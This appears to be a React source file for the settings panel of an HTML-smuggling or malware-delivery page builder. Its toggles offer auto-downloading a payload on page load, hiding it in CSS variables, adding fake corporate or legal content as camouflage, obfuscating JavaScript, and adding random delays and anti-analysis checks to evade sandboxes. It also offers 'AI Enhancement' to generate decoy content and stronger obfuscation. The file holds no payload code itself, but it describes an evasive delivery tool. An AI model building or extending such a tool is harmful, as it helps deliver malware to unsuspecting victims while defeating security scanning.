import { Sliders } from "lucide-react";
import { Config } from "@/pages/home";

interface ConfigurationPanelProps {
  config: Config;
  onConfigChange: (config: Config) => void;
}

export default function ConfigurationPanel({ config, onConfigChange }: ConfigurationPanelProps) {
  return (
    <div className="bg-card rounded-lg border border-border p-6">
      <h2 className="text-lg font-semibold mb-4 flex items-center">
        <Sliders className="text-primary mr-2 w-5 h-5" />
        Configuration
      </h2>
      
      <div className="space-y-4">
        <div>
          <label className="block text-sm font-medium mb-2">Encryption Key</label>
          <input
            type="text"
            placeholder="Enter encryption key..."
            value={config.encryptionKey}
            onChange={(e) => onConfigChange({ ...config, encryptionKey: e.target.value })}
            className="w-full px-3 py-2 bg-input border border-border rounded-lg text-sm focus:ring-2 focus:ring-primary focus:border-transparent"
            data-testid="input-encryption-key"
          />
          <p className="text-xs text-muted-foreground mt-1">Leave empty for auto-generated key</p>
        </div>
        
        <div className="flex items-center justify-between">
          <div>
            <p className="text-sm font-medium">Auto-download</p>
            <p className="text-xs text-muted-foreground">Automatically trigger download on page load</p>
          </div>
          <label className="relative inline-flex items-center cursor-pointer">
            <input
              type="checkbox"
              className="sr-only peer"
              checked={config.autoDownload}
              onChange={(e) => onConfigChange({ ...config, autoDownload: e.target.checked })}
              data-testid="toggle-auto-download"
            />
            <div className="w-11 h-6 bg-muted peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-primary/30 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-primary"></div>
          </label>
        </div>
        
        <div className="flex items-center justify-between">
          <div>
            <p className="text-sm font-medium">Stealth mode</p>
            <p className="text-xs text-muted-foreground">Hide payload in CSS for extra concealment</p>
          </div>
          <label className="relative inline-flex items-center cursor-pointer">
            <input
              type="checkbox"
              className="sr-only peer"
              checked={config.stealthMode}
              onChange={(e) => onConfigChange({ ...config, stealthMode: e.target.checked })}
              data-testid="toggle-stealth-mode"
            />
            <div className="w-11 h-6 bg-muted peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-primary/30 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-primary"></div>
          </label>
        </div>
        
        <div className="flex items-center justify-between">
          <div>
            <p className="text-sm font-medium">Fake content</p>
            <p className="text-xs text-muted-foreground">Add realistic document content as camouflage</p>
          </div>
          <label className="relative inline-flex items-center cursor-pointer">
            <input
              type="checkbox"
              className="sr-only peer"
              checked={config.fakeContent}
              onChange={(e) => onConfigChange({ ...config, fakeContent: e.target.checked })}
              data-testid="toggle-fake-content"
            />
            <div className="w-11 h-6 bg-muted peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-primary/30 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-primary"></div>
          </label>
        </div>
        
        <div className="flex items-center justify-between">
          <div>
            <p className="text-sm font-medium">Code obfuscation</p>
            <p className="text-xs text-muted-foreground">Obfuscate JavaScript code to evade detection</p>
          </div>
          <label className="relative inline-flex items-center cursor-pointer">
            <input
              type="checkbox"
              className="sr-only peer"
              checked={config.obfuscateCode}
              onChange={(e) => onConfigChange({ ...config, obfuscateCode: e.target.checked })}
              data-testid="toggle-obfuscate-code"
            />
            <div className="w-11 h-6 bg-muted peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-primary/30 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-primary"></div>
          </label>
        </div>
        
        <div className="flex items-center justify-between">
          <div>
            <p className="text-sm font-medium">Random delay</p>
            <p className="text-xs text-muted-foreground">Add random execution delays to evade sandbox detection</p>
          </div>
          <label className="relative inline-flex items-center cursor-pointer">
            <input
              type="checkbox"
              className="sr-only peer"
              checked={config.randomDelay}
              onChange={(e) => onConfigChange({ ...config, randomDelay: e.target.checked })}
              data-testid="toggle-random-delay"
            />
            <div className="w-11 h-6 bg-muted peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-primary/30 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-primary"></div>
          </label>
        </div>
        
        <div className="flex items-center justify-between">
          <div>
            <p className="text-sm font-medium">Anti-analysis</p>
            <p className="text-xs text-muted-foreground">Detect and evade sandboxes and analysis tools</p>
          </div>
          <label className="relative inline-flex items-center cursor-pointer">
            <input
              type="checkbox"
              className="sr-only peer"
              checked={config.antiAnalysis}
              onChange={(e) => onConfigChange({ ...config, antiAnalysis: e.target.checked })}
              data-testid="toggle-anti-analysis"
            />
            <div className="w-11 h-6 bg-muted peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-primary/30 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-primary"></div>
          </label>
        </div>
        
        <div>
          <label className="block text-sm font-medium mb-2">Storage Method</label>
          <select
            value={config.storageMethod}
            onChange={(e) => onConfigChange({ ...config, storageMethod: e.target.value as any })}
            className="w-full px-3 py-2 bg-input border border-border rounded-lg text-sm focus:ring-2 focus:ring-primary focus:border-transparent"
            data-testid="select-storage-method"
          >
            <option value="css">CSS Variables (Most Stealthy)</option>
            <option value="localStorage">Local Storage</option>
            <option value="sessionStorage">Session Storage</option>
            <option value="indexedDB">IndexedDB (Large Files)</option>
          </select>
          <p className="text-xs text-muted-foreground mt-1">Choose how to store the payload data</p>
        </div>
        
        <div className="border-t border-border pt-4">
          <h3 className="text-sm font-semibold mb-3 flex items-center">
            🤖 AI Enhancement
          </h3>
          
          <div className="flex items-center justify-between mb-4">
            <div>
              <p className="text-sm font-medium">AI-powered optimization</p>
              <p className="text-xs text-muted-foreground">Use AI to generate realistic content and advanced obfuscation</p>
            </div>
            <label className="relative inline-flex items-center cursor-pointer">
              <input
                type="checkbox"
                className="sr-only peer"
                checked={config.aiEnhanced}
                onChange={(e) => onConfigChange({ ...config, aiEnhanced: e.target.checked })}
                data-testid="toggle-ai-enhanced"
              />
              <div className="w-11 h-6 bg-muted peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-primary/30 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-primary"></div>
            </label>
          </div>
          
          {config.aiEnhanced && (
            <div className="space-y-4 pl-4 border-l border-primary/30">
              <div>
                <label className="block text-sm font-medium mb-2">AI Content Type</label>
                <select
                  value={config.aiContentType}
                  onChange={(e) => onConfigChange({ ...config, aiContentType: e.target.value as any })}
                  className="w-full px-3 py-2 bg-input border border-border rounded-lg text-sm focus:ring-2 focus:ring-primary focus:border-transparent"
                  data-testid="select-ai-content-type"
                >
                  <option value="auto">🎯 Auto-detect (Smart)</option>
                  <option value="corporate">🏢 Corporate/Business</option>
                  <option value="financial">💼 Financial Reports</option>
                  <option value="technical">⚙️ Technical Documentation</option>
                  <option value="legal">⚖️ Legal Documents</option>
                </select>
                <p className="text-xs text-muted-foreground mt-1">AI will generate contextually appropriate content</p>
              </div>
              
              <div>
                <label className="block text-sm font-medium mb-2">AI Obfuscation Level</label>
                <select
                  value={config.aiObfuscationLevel}
                  onChange={(e) => onConfigChange({ ...config, aiObfuscationLevel: e.target.value as any })}
                  className="w-full px-3 py-2 bg-input border border-border rounded-lg text-sm focus:ring-2 focus:ring-primary focus:border-transparent"
                  data-testid="select-ai-obfuscation-level"
                >
                  <option value="basic">🟢 Basic - Fast generation</option>
                  <option value="advanced">🟡 Advanced - Balanced (Recommended)</option>
                  <option value="expert">🔴 Expert - Maximum stealth</option>
                </select>
                <p className="text-xs text-muted-foreground mt-1">Higher levels use more sophisticated evasion techniques</p>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
